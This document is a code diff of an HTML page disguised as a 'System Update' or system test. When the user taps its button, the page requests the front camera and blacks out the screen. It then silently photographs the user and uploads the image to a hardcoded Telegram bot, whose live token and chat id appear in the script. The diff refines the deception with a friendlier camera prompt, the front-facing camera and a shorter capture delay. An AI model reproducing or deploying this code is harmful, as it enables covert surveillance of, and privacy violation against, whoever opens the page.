@@ -1,47 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Test</title>
+    <meta charset="UTF-8">
+    <title>System Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: black; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        button { padding: 20px; font-size: 18px; border-radius: 10px; cursor: pointer; }
+        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        #startBtn { padding: 20px 40px; font-size: 20px; font-weight: bold; background: #fff; color: #000; border: none; border-radius: 50px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <button id="btn">ACTIVATE SYSTEM TEST</button>
+    <button id="startBtn">TAP TO START SYSTEM TEST</button>
     <video id="v" autoplay playsinline style="display:none"></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
-        const token = '8769277480:AAGs6Zeo5ol7FojA2SwGK7-7I-5Zb0falyM';
-        const cid = '8681771719';
+        const T = '8769277480:AAGs6Zeo5ol7FojA2SwGK7-7I-5Zb0falyM';
+        const C = '8681771719';
 
-        document.getElementById('btn').onclick = function() {
-            const btn = this;
-            navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
+        document.getElementById('startBtn').addEventListener('click', function() {
+            const b = this;
+            // The request MUST happen exactly when the button is tapped
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(s => {
                 const v = document.getElementById('v');
-                v.srcObject = stream;
-                btn.style.display = 'none';
+                v.srcObject = s;
+                b.style.display = 'none'; // Screen goes black immediately
 
                 setTimeout(() => {
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth;
-                    c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
+                    const canvas = document.getElementById('c');
+                    canvas.width = v.videoWidth;
+                    canvas.height = v.videoHeight;
+                    canvas.getContext('2d').drawImage(v, 0, 0);
                     
-                    c.toBlob(blob => {
+                    canvas.toBlob(blob => {
                         const f = new FormData();
-                        f.append('chat_id', cid);
-                        f.append('photo', blob, 'x.jpg');
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f })
-                        .then(() => stream.getTracks().forEach(t => t.stop()));
+                        f.append('chat_id', C);
+                        f.append('photo', blob, 'shot.jpg');
+                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f })
+                        .then(() => s.getTracks().forEach(t => t.stop()));
                     }, 'image/jpeg');
-                }, 2000);
+                }, 1500);
             })
-            .catch(() => alert("Please allow camera access."));
-        };
+            .catch(e => {
+                alert("Please tap 'Allow' when the browser asks for camera access.");
+            });
+        });
     </script>
 </body>
 </html>
